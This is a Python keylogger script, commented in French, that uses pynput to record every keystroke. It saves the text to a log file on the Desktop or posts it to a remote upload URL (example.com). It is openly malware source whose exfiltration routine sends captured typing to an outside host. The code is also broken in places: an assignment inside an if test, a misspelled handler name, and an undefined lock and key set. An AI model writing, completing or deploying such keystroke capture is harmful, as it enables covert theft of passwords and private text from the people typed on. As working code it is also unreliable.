from pynput.keyboard import Key, Listener, KeyCode
import threading
import os
import time
import requests

last_keypress_time = time.time()  # initialiser la variable pour déterminer la denière frappe
is_first_run = True  # pour vérifier s'il s'agit de la première itération

#initialisation des variables
log = ""
path =  os.path.join(os.path.expanduser("~"), "Desktop/log.txt")
server = "local" #put server address here, or "local" if saved locally

def process_keys(key):
    global log, last_keypress_time, current_keys

    with lock:
        last_keypress_time = time.time()

        if isinstance(key, KeyCode):  # Gestion des touches standards
            log += key.char
        elif key in {Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.shift, Key.shift_r}:
            current_keys.add(key)  # Ajouter la touche spéciale active
        elif key in current_keys:  # Gestion des combinaisons détectées
            if Key.ctrl_l in current_keys or Key.ctrl_r in current_keys:
                log += "[Ctrl+{}]".format(key)
        else:
            special_keys = {
                Key.space: " ",
                Key.enter: "\n",
                Key.backspace: "\b",
                Key.up: "[UP]",
                Key.down: "[DOWN]",
                Key.left: "[LEFT]",
                Key.right: "[RIGHT]",
            }
            log += special_keys.get(key, "")
    on_release(key)
    
def on_release(key):
    """Supprimer les touches relâchées des combinaisons."""
    if key in current_keys:
        current_keys.remove(key)


def report():
    global log, path, is_first_run
    if server="local":
        #vérifier si le fichier de log est vide ou pas
        if is_first_run:
                if os.path.exists(path) and os.path.getsize(path) > 0:
                    with open(path, "a") as logfile:
                        logfile.write("\n")  # sauter une ligne si le fichier n'est pas vide
                        print("Fichier de log non vide, ajout nouvelle entrée")
    
                is_first_run = False  #assurer que cette action se produit qu'une seule fois
    
        if time.time() - last_keypress_time >= 15: #attend 15 secondes après la dernière frappe avant de sauvegarder dans le fichier de log
            if log:
                with open(path, "a") as logfile:
                    logfile.write(log)
                    print("Rapport enregistré (inactivité de 15s)")
                log = ""
                logfile.close()
        threading.Timer(1, report).start()
    else:
        if time.time() - last_keypress_time >= 15: #attend 15 secondes après la dernière frappe avant de sauvegarder dans le fichier de log
            if log:
                send_logs_to_server()

def send_logs_to_server():
    """Envoie les logs à un serveur distant."""
    global log

    with lock:
        if log:
            try:
                response = requests.post("http://example.com/upload", data={"log": log}) #Nous n'avons pas deploye de serveur distant pour tester.
                if response.status_code == 200:
                    log = ""  # Vider le log après un envoi réussi
            except requests.RequestException as e:
                print(f"Erreur lors de l'envoi des logs : {e}")


keyboard_listener = Listener(on_press=processkeys)
report()  # démarre le premier rapport

with keyboard_listener:
    keyboard_listener.join()
